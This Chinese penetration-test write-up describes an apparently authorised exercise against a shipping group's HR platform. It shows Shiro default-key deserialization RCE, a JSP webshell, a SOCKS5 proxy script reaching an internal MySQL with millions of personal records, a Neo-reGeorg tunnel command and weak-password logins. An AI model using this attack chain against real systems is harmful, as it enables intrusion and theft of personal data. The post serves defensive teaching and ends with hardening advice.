# **0x00 前言**

本次文章分享是有渗透测试授权的，且下面的漏洞都已经被修复，文章相关图片都已经被打码了，不做任何未授权、有危害的渗透测试、漏洞挖掘、攻防行为。这次演练的目标是一家省属航运集团的人力资源智能管控平台。从登录页看，它是一个再普通不过的 HR 系统：用户名、密码、验证码，页面下方一行备案号。

但越普通的系统，越容易在"默认配置"上翻车。整个攻击链没有用任何 0day，都为公开工具 + 默认配置 + 运维习惯：

信息收集  →  Shiro 默认 Key 反序列化 RCE
          →  静态目录里翻到 /etc/passwd
          →  落地 webshell 做权限维持
          →  以被控主机为跳板连内网数据库
          →  270 个库 / 六百万条业务数据
          →  Neo-reGeorg 突破内网隔离
          →  内网监管系统弱口令进后台

下面按攻击顺序复盘。

# **0x01 资产发现：一个登录页暴露的信息**

目标入口是 [http://x.x.x.x:32100/HRFT/](http://x.x.x.x:32100/HRFT/%EF%BC%8C%E6%89%93%E5%BC%80%E5%B0%B1%E6%98%AF%E6%A0%87%E5%87%86%E7%9A%84) 打开就是标准的 HR 平台登录页：

![](https://xzfile.aliyuncs.com/2026/11/16/1642/e1e25d1e-07a.png)

页面底部有备案号，顺手在工信部备案系统查了一下，主办单位、域名、审核时间都能对上，资产归属没有争议——这一步在演练里很关键，能避免打错资产的尴尬：

![](https://xzfile.aliyuncs.com/2026/11/16/1642/249a9bc2-a1f.png)

# **0x02 Shiro 默认 Key一次就中**

Shiro 的 rememberMe 功能会把序列化后的对象用 AES 加密后放进 Cookie。问题出在两代版本上：

· **Shiro-550**（≤ 1.2.4）：AES 密钥硬编码在代码里，默认值 kPH+bIxk5D2deZiIxcaaaA== 公开，只要没换 Key，攻击者就能自己加密任意序列化数据；

· **Shiro-721**：Padding Oracle，利用成本更高，需要已知一个合法 Cookie。

这里直接用公开的 Shiro 利用工具（SummerSec 的 ShiroAttack2）做验证，目标地址填进去，先检测当前密钥

![](https://xzfile.aliyuncs.com/2026/11/16/1643/20845878-9fb.png)

结果如下：

· 指定密钥 kPH+bIxk5D2deZiIxcaaaA== —— **命中**；

· 利用链 CommonsBeanutilsString —— 可用；

· 回显方式 TomcatEcho —— 可用；

· 执行 whoami —— 返回 root。

<http://x.x.x.x:32100/HRFT/static/files/passwd.txt>

浏览器直接打开，返回的是完整的 /etc/passwd

# **0x04 落地WebShell把一次性RCE变成长期据点**

Shiro 反序列化的流量特征太明显，一旦防守方上设备就容易被抓。所以第二步是通过RCE往Web 目录写一个 Webshell，把一次性命令执行变成可复用的据点

<http://x.x.x.x:32100/rx8k.jsp>        连接密钥：HlJ#Rt\*\*\*\*

写的是JSP马，连上之后直接是root权限

![](https://xzfile.aliyuncs.com/2026/11/16/1645/244b0c90-6da.png)

从环境变量里能读到不少东西：

· CATALINA\_BASE=/usr/service/apache-tomcat-9.0.38，JAVA\_HOME 指向 JDK 1.8.0\_171；

· SSH\_CLIENT / SSH\_CONNECTION 显示有运维从某个公网 IP 通过 SSH 登录过，SSH\_TTY=/dev/pts/0 说明会话还挂着；

· 主机名 ecs-4f90-0001，典型的云主机命名。

再看网卡

![](https://xzfile.aliyuncs.com/2026/11/16/1647/192788b8-e95.png)

这台主机同时处在 192.168.0.0/24 内网里，公网侧通过端口映射把 32100 暴露出来。**一台机器同时能出公网、能进内网，就是后面做内网穿透的条件。**

# **0x05 打数据库一个实例装下整个集团**

真正的大鱼不在Web上，在数据库里。

先在 Web 目录里写一个 sq1.jsp，用它把应用里配置的数据源反射出来——数据库不在本机，而是云上的一个 MySQL 实例

```
119.**.**.203:53306     账号 **user / ******
```

这个地址从我们的出口直接连不上，实例只对特定网段 / 白名单开放。所以思路要换一下：**让流量从被控主机出去**，而不是从我们这边进去。

正好 Webshell 自带内网穿透模块，在目标本机起一个 SOCKS5（127.0.0.1:1082），之后的 Python 脚本就从这个口子把 MySQL 连接送出去

```
import socks, pymysql

s = socks.socksocket()
s.set_proxy(socks.SOCKS5, "127.0.0.1", 1082)     # 目标机本地的 SOCKS
s.connect(("119.**.**.203", 53306))               # 数据库只认内网/白名单

conn = pymysql.connect(
    host="119.**.**.203", port=53306,
    user="***user", password="******",
    charset="utf8mb4", connect_timeout=10, sock=s,
)
cur = conn.cursor()
cur.execute("show databases")
for (db,) in cur.fetchall():
    print(db)
```

连上之后，show databases 返回了 **270 个库**

![](https://xzfile.aliyuncs.com/2026/11/16/1650/f03bb241-3aa.png)

一开始还以为连错了实例，里面完全没有出现上面登陆界面的集团信息，直到把库名从头翻到尾，

![](https://xzfile.aliyuncs.com/2026/11/16/1651/8eaf4476-d1a.png)![](https://xzfile.aliyuncs.com/2026/11/16/1652/972f4940-e48.png)

这不是一个业务库，而是**全集团 22 户权属企业的业务数据库总集**，从港务局到船务公司、从供应链到物业，全部挤在同一个实例上。按年份分库（2023/2024/2025/2026），说明每年还在往里堆，从来没做过隔离。

库里的东西就更直接了。XM（姓名）、ZJ（证件号）、DW（单位）、工资、考勤、职称申报，一张表一张表地躺着让我慢慢翻，数据量太大了。

![](https://xzfile.aliyuncs.com/2026/11/16/1653/a18c3861-27f.png)

单是 zhongzhuan\_shipping 这一张表就有 **41831 行**；整个实例的数据量在 **六百万条以上**，其中包含大量身份证号、手机号、工资明细这类敏感个人信息。

![](https://xzfile.aliyuncs.com/2026/11/16/1654/f7564aef-b04.png)![](https://xzfile.aliyuncs.com/2026/11/16/1654/a677fec4-d0a.png)

在 sys\_user 表里还翻到了账号密码，密码是 32 位 MD5

![](https://xzfile.aliyuncs.com/2026/11/16/1654/ddadc859-fa9.png)

从合规角度看，这已经不只是演练拿分的问题了：身份证号属于敏感个人信息，按照《个人信息保护法》《数据安全法》，这种一个实例装下全集团、账号共用、弱口令、无审计的架构，一旦被打穿就是集团级的数据安全事件。

# **0x06 突破内网隔离**

数据库到手后，应该是数据分全部拿满了，下一个目标是内网。前面 ipconfig 已经看到192.168.0.0/24，但从公网到内网中间隔着 NAT 和策略，需要一个稳定的隧道。

这里用的是 Neo-reGeorg：把 tn9.jsp 传到目标的 ROOT 目录，本地起客户端连上去

![](https://xzfile.aliyuncs.com/2026/11/16/1710/dffea373-493.png)

```
python3 neoreg.py -k HIGRt**** \
  -U http://x.x.x.x:32100/tn9.jsp \
  -P 1082 --skip --force
```

![](https://xzfile.aliyuncs.com/2026/11/16/1657/37d6d02f-a2f.png)

隧道起来后，浏览器挂上 SOCKS5 127.0.0.1:1082，当时时间有限证明能进内网就结束演练了。索性就在浏览器上直接挂上了。

![](https://xzfile.aliyuncs.com/2026/11/16/1658/3bae1d4b-a7e.png)

先访问被控主机自己的内网地址，返回 nginx 默认页，说明隧道是通的

![](https://xzfile.aliyuncs.com/2026/11/16/1658/054f3494-fd5.png)

再横向扫了一段内网，在 192.168.0.\*:32100 上发现了另一套系统——**人力资源数字化在线监管系统**

**该说不说，就很巧，本想着证明突破隔离就结束，看到登陆界面，一下就手痒**

![](https://xzfile.aliyuncs.com/2026/11/16/1659/7ea9e63e-755.png)

# **0x07 内网弱口令 从能访问到能管理**

内网系统的口令习惯通常比外网更差。试了几组常见组合，hhgwj / \*\*\* 直接登进了 HR 平台后台

![](https://xzfile.aliyuncs.com/2026/11/16/1700/a73da351-c87.png)

后台首页把家底都摆出来了：在册员工 1240 人、在岗 1113 人，应得工资总额、实支工资总额。到这一步，拿下 Web 用户权限的成果已经坐实。

同一套口令思路在监管系统上继续试，admin / 123456 登录成功，直接进了管理员面板

![](https://xzfile.aliyuncs.com/2026/11/16/1701/0edf321f-49e.png)

到这里，从外网一个登录页，到集团 HR 平台的 root、到 270 个业务库、再到内网两套系统的管理后台，整条链路就闭合了。

# **0x08 最后**

这次演练最大的感受是：**防线的强度不取决于最复杂的那个漏洞，而取决于最懒的那次配置。**

Shiro 默认 Key 是 2016 年的老洞，admin/123456 是二十年前的口令，/etc/passwd 放在 Web 目录是最低级的失误——但它们凑在一起，就能把一个集团的人员库、工资表、身份证号全部端走。对防守方来说，与其追新 CVE，不如先把默认值、弱口令、静态目录、数据库白名单这四件事做干净。

> 全文不涉及任何未公开漏洞，攻击链全部由默认配置、弱口令与运维疏漏串联而成。
